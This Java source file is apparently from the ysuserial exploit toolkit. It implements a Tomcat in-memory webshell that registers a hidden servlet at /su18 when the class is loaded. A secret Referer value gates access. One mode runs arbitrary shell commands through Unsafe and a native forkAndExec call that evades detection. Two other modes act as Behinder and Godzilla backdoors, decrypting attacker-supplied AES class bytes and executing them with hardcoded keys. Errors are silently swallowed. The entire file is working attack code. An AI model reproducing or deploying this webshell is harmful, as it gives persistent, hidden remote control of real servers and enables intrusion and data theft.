package org.su18.ysuserial.payloads.templates.memshell.tomcat;

import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.Request;
import org.apache.tomcat.util.http.Parameters;
import sun.misc.Unsafe;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

/**
 * 使用 Thread 注入 Tomcat Servlet 型内存马
 * <p>
 * 前提条件：Referer: https://su18.org/
 * X-SSRF-TOKEN 如果为 ce 则执行命令
 * X-SSRF-TOKEN 如果为 bx 则为冰蝎马   密码 su18yyds
 * X-SSRF-TOKEN 如果为 gz 则为哥斯拉马 pass su18 key su18yyds
 */
public class TSMSFromThread implements Servlet {

	static {
		try {
			String servrletName = "su18" + System.nanoTime();
			String urlPattern   = "/su18";

			// 获取 standardContext
			WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
			StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();

			if (standardContext.findChild(servrletName) == null) {
				Wrapper wrapper = standardContext.createWrapper();
				wrapper.setName(servrletName);
				standardContext.addChild(wrapper);
				Servlet servlet = new TSMSFromThread();

				wrapper.setServletClass(servlet.getClass().getName());
				wrapper.setServlet(servlet);
				ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
				registration.addMapping(urlPattern);
			}
		} catch (Exception ignored) {
		}
	}

	String xc = "7ff9fe91aaa7d3aa"; // key

	String pass = "su18";

	String md5 = md5(pass + xc);

	Class payload;

	public static String md5(String s) {
		String ret = null;
		try {
			java.security.MessageDigest m;
			m = java.security.MessageDigest.getInstance("MD5");
			m.update(s.getBytes(), 0, s.length());
			ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
		} catch (Exception ignored) {
		}
		return ret;
	}

	public static String base64Encode(byte[] bs) throws Exception {
		Class  base64;
		String value = null;
		try {
			base64 = Class.forName("java.util.Base64");
			Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
			value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
		} catch (Exception e) {
			try {
				base64 = Class.forName("sun.misc.BASE64Encoder");
				Object Encoder = base64.newInstance();
				value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
			} catch (Exception ignored) {
			}
		}
		return value;
	}

	public static byte[] base64Decode(String bs) throws Exception {
		Class  base64;
		byte[] value = null;
		try {
			base64 = Class.forName("java.util.Base64");
			Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
		} catch (Exception e) {
			try {
				base64 = Class.forName("sun.misc.BASE64Decoder");
				Object decoder = base64.newInstance();
				value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
			} catch (Exception ignored) {
			}
		}
		return value;
	}

	@Override
	public void init(ServletConfig servletConfig) throws ServletException {

	}

	@Override
	public ServletConfig getServletConfig() {
		return null;
	}

	@Override
	public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
		HttpServletRequest  request  = (HttpServletRequest) servletRequest;
		HttpServletResponse response = (HttpServletResponse) servletResponse;
		try {
			// 入口
			if (request.getHeader("Referer").equalsIgnoreCase("https://su18.org/")) {
				Object lastRequest  = request;
				Object lastResponse = response;
				// 解决包装类RequestWrapper的问题
				// 详细描述见 https://github.com/rebeyond/Behinder/issues/187
				if (!(lastRequest instanceof RequestFacade)) {
					Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
					lastRequest = getRequest.invoke(request);
					while (true) {
						if (lastRequest instanceof RequestFacade) break;
						lastRequest = getRequest.invoke(lastRequest);
					}
				}
				// 解决包装类ResponseWrapper的问题
				if (!(lastResponse instanceof ResponseFacade)) {
					Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
					lastResponse = getResponse.invoke(response);
					while (true) {
						if (lastResponse instanceof ResponseFacade) break;
						lastResponse = getResponse.invoke(lastResponse);
					}
				}
				// cmdshell
				if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("ce")) {

					String cmd = request.getHeader("X-Token-Data");
					if (cmd != null && !cmd.isEmpty()) {
						String[] cmds = null;
						if (System.getProperty("os.name").toLowerCase().contains("win")) {
							cmds = new String[]{"cmd", "/c", cmd};
						} else {
							cmds = new String[]{"/bin/bash", "-c", cmd};
						}

						Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
						theUnsafeField.setAccessible(true);
						Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

						Class processClass = null;

						try {
							processClass = Class.forName("java.lang.UNIXProcess");
						} catch (ClassNotFoundException e) {
							processClass = Class.forName("java.lang.ProcessImpl");
						}

						Object processObject = unsafe.allocateInstance(processClass);

						byte[][] args = new byte[cmds.length - 1][];
						int      size = args.length;

						for (int i = 0; i < args.length; i++) {
							args[i] = cmds[i + 1].getBytes();
							size += args[i].length;
						}

						byte[] argBlock = new byte[size];
						int    i        = 0;

						for (byte[] arg : args) {
							System.arraycopy(arg, 0, argBlock, i, arg.length);
							i += arg.length + 1;
						}

						int[] envc                 = new int[1];
						int[] std_fds              = new int[]{-1, -1, -1};
						Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
						Field helperpathField      = processClass.getDeclaredField("helperpath");
						launchMechanismField.setAccessible(true);
						helperpathField.setAccessible(true);
						Object launchMechanismObject = launchMechanismField.get(processObject);
						byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

						int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

						Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
								byte[].class, int.class, byte[].class, int[].class, boolean.class);

						forkMethod.setAccessible(true);//

						forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
								null, envc[0], null, std_fds, false);

						Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
						initStreamsMethod.setAccessible(true);
						initStreamsMethod.invoke(processObject, std_fds);

						Method getInputStreamMethod = processClass.getMethod("getInputStream");
						getInputStreamMethod.setAccessible(true);
						InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

						ByteArrayOutputStream baos = new ByteArrayOutputStream();
						int                   a    = 0;
						byte[]                b    = new byte[1024];

						while ((a = in.read(b)) != -1) {
							baos.write(b, 0, a);
						}

						((ResponseFacade) lastResponse).getWriter().println(baos);
					}
				} else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("bx")) {
					if (request.getMethod().equals("POST")) {
						// 创建pageContext
						HashMap pageContext = new HashMap();

						// lastRequest的session是没有被包装的session!!
						HttpSession session = ((RequestFacade) lastRequest).getSession();
						pageContext.put("request", lastRequest);
						pageContext.put("response", lastResponse);
						pageContext.put("session", session);
						// 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
						StringBuilder payload = new StringBuilder(request.getReader().readLine());
						if (payload == null || (payload.length() == 0)) {
							payload = new StringBuilder();
							// 拿到真实的Request对象而非门面模式的RequestFacade
							Field field = lastRequest.getClass().getDeclaredField("request");
							field.setAccessible(true);
							Request realRequest = (Request) field.get(lastRequest);
							// 从coyoteRequest中拼接body参数
							Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
							coyoteRequestField.setAccessible(true);
							org.apache.coyote.Request coyoteRequest   = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
							Parameters                parameters      = coyoteRequest.getParameters();
							Field                     paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
							paramHashValues.setAccessible(true);
							LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);

							Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
							while (iterator.hasNext()) {
								Map.Entry<String, ArrayList<String>> next           = iterator.next();
								String                               paramKey       = next.getKey().replaceAll(" ", "+");
								ArrayList<String>                    paramValueList = next.getValue();
								if (paramValueList.size() == 0) {
									payload.append(paramKey);
								} else {
									payload.append(paramKey).append("=").append(paramValueList.get(0));
								}
							}
						}


						// 冰蝎逻辑
						String k = "7ff9fe91aaa7d3aa";
						session.putValue("u", k);
						Cipher c = Cipher.getInstance("AES");
						c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
						Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
						method.setAccessible(true);
						byte[] evilclass_byte = c.doFinal(base64Decode(payload.toString()));
						Class  evilclass      = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
						evilclass.newInstance().equals(pageContext);
					}
				} else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("gz")) {
					// 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
					byte[] data = base64Decode(request.getParameter(pass));
					data = x(data, false);
					if (payload == null) {
						URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
						Method         defMethod      = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
						defMethod.setAccessible(true);
						payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
					} else {
						java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
						Object                        f      = payload.newInstance();
						f.equals(arrOut);
						f.equals(data);
						f.equals(request);
						response.getWriter().write(md5.substring(0, 16));
						f.toString();
						response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
						response.getWriter().write(md5.substring(16));
					}
				}
			}
		} catch (Exception ignored) {
		}
	}

	public byte[] x(byte[] s, boolean m) {
		try {
			javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
			c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
			return c.doFinal(s);
		} catch (Exception e) {
			return null;
		}
	}

	@Override
	public String getServletInfo() {
		return null;
	}

	@Override
	public void destroy() {

	}

	public static byte[] toCString(String s) {
		if (s == null)
			return null;
		byte[] bytes  = s.getBytes();
		byte[] result = new byte[bytes.length + 1];
		System.arraycopy(bytes, 0,
				result, 0,
				bytes.length);
		result[result.length - 1] = (byte) 0;
		return result;
	}
}
